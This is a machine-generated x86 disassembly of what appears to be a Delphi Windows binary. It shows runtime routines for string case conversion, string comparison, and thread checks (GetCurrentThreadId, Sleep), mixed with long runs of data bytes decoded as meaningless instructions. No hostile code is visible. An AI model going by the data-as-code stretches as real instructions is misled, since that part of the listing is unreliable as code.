add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004345 ] dl
add [ eax ] al
add [ esp + eax * 2 + 0x43 ] cl
add [ edx + eax * 4 + 0x44 ] ch
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
nop
nop
xor [ ebx + eax * 2 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx + eax * 2 ] al
sbb al 0x0
jmp sub_43be14
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc esi
inc ebx
add [ eax ] cl
add [ eax ] al
loopne r-xdata
imul ebp [ edi + 0x6e ] 0x4345b090
add [ ecx ] dl
add edi [ edx ]
cmp [ esp + eax ] esi
add [ eax ] al
add ah al
push esi
inc esp
add [ edx ] cl
add [ eax ] al
les edx [ esi + 0x44 ]
add [ eax ] cl
push ebx
jns r-xdata
inc ebp
js r-xdata
sbb [ 0x4346b03f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc edi
inc ebx
add ah cl
inc esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 + 0x43 ] al
add [ eax + eax ] dh
add [ eax ] al
fcom [ edi + 0x44 ]
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax - 0x47 ] bl
inc esp
add [ ecx + edi * 4 + 0x44 ] ah
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ ecx + edi * 4 + 0x44 ] dh
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x240043bd ] cl
push esp
dec ebp
jne r-xdata
jb r-xdata
mov ebx 0x54130043
push esp
push 0x64616572
dec esp
inc esp
push ebp
je r-xdata
add [ eax ] al
add al bh
insb
jne r-xdata
je r-xdata
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd4004481
add eax 0xffffffd4
jmp r-xdata
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah dl
add [ eax + eax + 0x4c ] 0x84
inc esp
insb
jae r-xdata
pushad
dec eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x43 ] bh
add [ eax ] dl
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffbb7f ] ah
jns r-xdata
je r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
inc edi
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
add [ eax ] al
add [ eax ] al
clc
push edx
push ebx
push esi
push edi
push ecx
mov edi eax
mov edx esp
mov eax [ edi + 0x20 ]
call sub_43bc48
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ edi + 0x24 ]
je r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
nop
aam 0x45
inc ebx
add [ ecx ] dl
add edi [ edx ]
xor [ 0x4 ] dh
les edx [ esi + 0x44 ]
add [ edx ] cl
add [ eax ] al
les edx [ esi + 0x44 ]
add [ eax ] cl
push ebx
jns r-xdata
add [ eax ] cl
dec ecx
inc ebx
add [ eax + eax ] bl
add [ eax ] al
or [ eax + 0x43 ] cl
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
popad
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
arpl [ eax + 0x72 ] bp
outsd
outsb
imul edi [ edx + 0x65 ] 0x90909072
jo r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
jb r-xdata
push ebp
je r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ eax ] cl
dec eax
inc ebx
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
inc ebx
add [ ecx ] dl
or dl [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
mov eax edi
call sub_43bdf4
jmp r-xdata
add [ ecx + 0x1004346 ] cl
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
outsd
arpl [ ecx + 0x6c ] sp
inc ebx
outsd
jne r-xdata
popad
dec esp
insb
jae r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
jb r-xdata
lea eax [ edi + 0xc ]
call sub_43bbb8
test eax eax
jle r-xdata
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add al bl
nop
mov al 0x4
add al [ eax ]
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x64004481 ] ah

add [ ecx ] cl
push esp
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x48e09090
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
inc ebp
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x6f727245
jb r-xdata
fcomp [ ebp - 0x61d7ffbd ]
popad
jns r-xdata
lea eax [ edi + 0xc ]
call sub_43bbac
mov esi eax
cmp esi 0xffff
jne r-xdata
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] al
push 0x0
call Sleep
mov eax edi
call sub_43bdf4
mov eax edi
call sub_43bde8
sub_4346b0
xchg ecx eax
inc esi
inc ebx
add [ ebx - 0x5affbcba ] bl
inc esi
inc ebx
add [ ecx + 0x46 ] dh
inc ebx
add [ ecx + 0x46 ] bh
inc ebx
add [ ecx - 0x76ffbcba ] al
inc esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
inc ebp
js r-xdata
sbb [ 0x4346b03f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
inc edi
inc ebx
add ah cl
inc esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 2 + 0x43 ] al
add [ eax + eax ] dh
add [ eax ] al
fcom [ edi + 0x44 ]
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax - 0x47 ] bl
inc esp
add [ ecx + edi * 4 + 0x44 ] ah
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ ecx + edi * 4 + 0x44 ] dh
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x240043bd ] cl
push esp
dec ebp
jne r-xdata
add [ eax ] al
add al bh
insb
jne r-xdata
je r-xdata
pushad
dec eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x43 ] bh
add [ eax ] dl
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffbb7f ] ah
jns r-xdata
je r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
inc edi
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
add [ eax ] al
add [ eax ] al
clc
push edx
add [ eax ] cl
dec ecx
inc ebx
add [ eax + eax ] bl
add [ eax ] al
or [ eax + 0x43 ] cl
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
popad
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bl
arpl [ eax + 0x72 ] bp
outsd
outsb
imul edi [ edx + 0x65 ] 0x90909072
jo r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ eax ] cl
dec eax
inc ebx
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
inc ebx
add [ ecx ] dl
or dl [ ebx + eax * 2 + 0x68 ]
popad
jb r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
jb r-xdata
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x64004481 ] ah

add [ ecx ] cl
push esp
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x48e09090
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
inc ebp
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x6f727245
jb r-xdata
fcomp [ ebp - 0x61d7ffbd ]
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] al
sub_43479c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc edi
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov esp 0x6c004337
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax + 0x4400439e ] al
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xd8004481
popfd
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
inc ebp
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x6f727245
jb r-xdata
pushad
dec eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 2 + 0x43 ] bh
add [ eax ] dl
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffbb7f ] ah
jns r-xdata
add [ eax ] cl
dec ecx
inc ebx
add [ eax + eax ] bl
add [ eax ] al
or [ eax + 0x43 ] cl
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ eax ] cl
dec eax
inc ebx
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ eax - 0x6fffbb87 ] dl
jns r-xdata
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x64004481 ] ah

add [ ecx ] cl
push esp
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x48e09090
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_434908
or eax 0x43424d54
push ebx
inc ebp
outsb
arpl [ edi + 0x64 ] bp
imul ebp [ esi + 0x67 ] 0x49709090
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004349 ] bl
add [ eax ] al
add [ eax + 0x6c004348 ] cl
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x38004481 ] ah
int3
sub_4349ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ edx + 0x43 ] cl
add [ eax + eax ] bl
add [ eax ] al
sbb [ ecx + 0x43 ] cl
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x38004481 ] ah
int3
sub_434a3c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x4a
inc ebx
add [ eax ] dl
add [ eax ] al
add [ eax ] cl
dec eax
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x28004481 ] ah
int 0x43
add [ eax ] dh
int 0x43
add [ ebp + ecx * 8 + 0x43 ] cl
add [ eax - 0x33 ] bl
inc ebx
add [ eax - 0x33 ] bh
inc ebx
add [ eax - 0x6fffbc33 ] al
int 0x43
add ah bh
int3
sub_434ac8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0x4b
inc ebx
add [ eax ] dl
add [ eax ] al
add [ eax ] bh
dec edx
inc ebx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x28004481 ] ah
int 0x43
add [ eax + 0x4c0043cd ] bh
int 0x43
add ah ch
int 0x43
add [ eax - 0x33 ] bh
inc ebx
add [ eax + 0x280043cd ] al
into
inc ebx
add ah bh
int3
sub_434b58
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_434b8c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
pop edi
pop esi
pop ebx
retn
sub_434bb0
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4474a8
call ebx
pop ebx
retn
sub_434bdc
push ebx
mov ebx eax
mov eax 0xc
call sub_44748c
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_434bb0
pop ebx
retn
sub_434c28
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_449f30
cmp [ ebx ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax edx
mov [ esp ] edx
mov edx [ esp ]
test edx edx
je r-xdata
cmp edx 0x1
jl r-xdata
sub edx 0x4
mov edx [ edx ]
movzx ecx [ eax ]
add ecx 0xffffff9f
sub cx 0x1a
jae r-xdata
add eax 0x2
dec edx
test edx edx
jne r-xdata
movzx ecx [ eax ]
xor cx 0x20
mov [ eax ] cx
sub_434c78
push ebx
push esi
push edi
push ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
mov ax 0x2
mov eax ebx
sub eax 0xa
movzx eax [ eax ]
jmp r-xdata
mov eax ebx
test eax eax
je r-xdata
mov edx edi
mov [ esp ] ebx
mov eax [ esp ]
call sub_434c28
jmp r-xdata
cmp ax 0x2
je r-xdata
mov esi eax
mov eax edi
mov edx esi
call sub_449fd0
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ edi ]
mov edx esi
cmp edx 0x1
jl r-xdata
movzx eax [ ebx ]
mov esi eax
add esi 0xffffff9f
sub si 0x1a
jae r-xdata
mov [ ecx ] ax
add ecx 0x2
add ebx 0x2
dec edx
test edx edx
jne r-xdata
xor ax 0x20
sub_434cf0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_449f30
cmp [ ebx ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
mov edx [ ebx ]
mov eax edx
mov [ esp ] edx
mov edx [ esp ]
test edx edx
je r-xdata
cmp edx 0x1
jl r-xdata
sub edx 0x4
mov edx [ edx ]
movzx ecx [ eax ]
add ecx 0xffffffbf
sub cx 0x1a
jae r-xdata
add eax 0x2
dec edx
test edx edx
jne r-xdata
movzx ecx [ eax ]
or cx 0x20
mov [ eax ] cx
sub_434d40
push ebx
push esi
push edi
push ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
mov ax 0x2
mov eax ebx
sub eax 0xa
movzx eax [ eax ]
jmp r-xdata
mov eax ebx
test eax eax
je r-xdata
mov edx edi
mov [ esp ] ebx
mov eax [ esp ]
call sub_434cf0
jmp r-xdata
cmp ax 0x2
je r-xdata
mov esi eax
mov eax edi
mov edx esi
call sub_449fd0
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ edi ]
mov edx esi
cmp edx 0x1
jl r-xdata
movzx eax [ ebx ]
mov esi eax
add esi 0xffffffbf
sub si 0x1a
jae r-xdata
mov [ ecx ] ax
add ecx 0x2
add ebx 0x2
dec edx
test edx edx
jne r-xdata
or ax 0x20
sub_434db8
cmp eax edx
je r-xdata
xor eax eax
retn
test eax edx
je r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
cmp [ eax - 0xa ] 0x2
je r-xdata
sub eax [ edx - 0x4 ]
retn
test edx edx
jne r-xdata
cmp [ edx - 0xa ] 0x2
je r-xdata
push edx
mov edx eax
mov eax esp
call sub_449f30
pop edx
mov eax [ esp ]
mov eax [ eax - 0x4 ]
retn
movzx ecx [ edx ]
cmp cx [ eax ]
je r-xdata
push eax
lea eax [ esp + 0x8 ]
call sub_449f30
pop eax
mov edx [ esp + 0x4 ]
push ebx
mov ebx [ eax - 0x4 ]
xor ecx ecx
sub ebx [ edx - 0x4 ]
push ebx
adc ecx 0xffffffff
and ecx ebx
sub ecx [ eax - 0x4 ]
shl ecx 0x1
sub eax ecx
sub edx ecx
movzx eax [ eax ]
sub eax ecx
jmp r-xdata
bsf ebx ebx
shr ebx 0x4
add ebx ebx
add ecx ebx
jns r-xdata
add ecx 0x4
js r-xdata
mov ecx esp
mov edx [ ecx ]
or edx [ ecx + 0x4 ]
je r-xdata
pop eax
pop ebx
movzx eax [ ecx + eax ]
movzx edx [ ecx + edx ]
sub eax edx
pop ebx
pop ebx
jmp r-xdata
mov ebx [ ecx + eax ]
xor ebx [ ecx + edx ]
jne r-xdata
pop edx
pop edx
retn
push eax
mov eax ecx
mov edx 0x2
call sub_44936c
pop eax
sub_434e78
add eax ecx
add edx ecx
xor ecx 0xffffffff
add eax 0xfffffff8
add edx 0xfffffff8
add ecx 0x9
push ebx
jg r-xdata
cmp ecx 0x4
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
cmp ecx 0x6
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
xor eax eax
pop ebx
retn
lea ebx [ ecx + eax ]
add ecx 0x4
and ebx 0x3
sub ecx ebx
jg r-xdata
cmp ecx 0x7
jg r-xdata
movzx ebx [ ecx + eax ]
cmp bx [ ecx + edx ]
jne r-xdata
add ecx 0x4
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov eax 0x1
pop ebx
retn
movzx ebx [ eax + 0x7 ]
cmp bl [ edx + 0x7 ]
jne r-xdata
add ecx 0x2
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov ebx [ ecx + eax + 0x4 ]
cmp ebx [ ecx + edx + 0x4 ]
jne r-xdata
add ecx 0x8
jle r-xdata
sub_434f0c
test eax eax
jne r-xdata
test edx edx
jne r-xdata
test edx edx
je r-xdata
push ebx
push ebp
push esi
push 0x0
push 0x0
cmp [ eax - 0xa ] 0x2
je r-xdata
mov eax [ eax - 0x4 ]
retn
retn
mov eax [ edx - 0x4 ]
neg eax
cmp [ edx - 0xa ] 0x2
je r-xdata
push edx
mov edx eax
lea eax [ esp + 0x4 ]
call sub_449f30
pop edx
mov eax [ esp ]
mov ebp [ eax - 0x4 ]
mov ebx [ edx - 0x4 ]
sub ebp ebx
sbb ecx ecx
and ecx ebp
add ecx ebx
lea esi [ eax + ecx * 2 ]
add edx ecx
add edx ecx
neg ecx
je r-xdata
push eax
lea eax [ esp + 0x8 ]
call sub_449f30
pop eax
mov edx [ esp + 0x4 ]
mov eax ebp
mov eax [ esi + ecx * 2 ]
mov ebx [ edx + ecx * 2 ]
cmp eax ebx
je r-xdata
add esp 0x8
pop esi
pop ebp
pop ebx
retn
push eax
mov eax ecx
mov edx 0x2
call sub_44936c
pop eax
add ecx 0x2
jl r-xdata
cmp ax bx
je r-xdata
shr eax 0x10
shr ebx 0x10
cmp eax 0x61
jl r-xdata
and eax 0xffff
and ebx 0xffff
cmp eax 0x61
jl r-xdata
cmp ebx 0x61
jl r-xdata
cmp eax 0x7a
jg r-xdata
cmp ebx 0x61
jl r-xdata
cmp eax 0x7a
jg r-xdata
sub eax ebx
jne r-xdata
cmp ebx 0x7a
jg r-xdata
sub eax 0x20
sub eax ebx
jne r-xdata
cmp ebx 0x7a
jg r-xdata
sub eax 0x20
mov ecx esp
mov edx [ ecx ]
or edx [ ecx + 0x4 ]
je r-xdata
sub ebx 0x20
mov eax [ esi + ecx * 2 ]
mov ebx [ edx + ecx * 2 ]
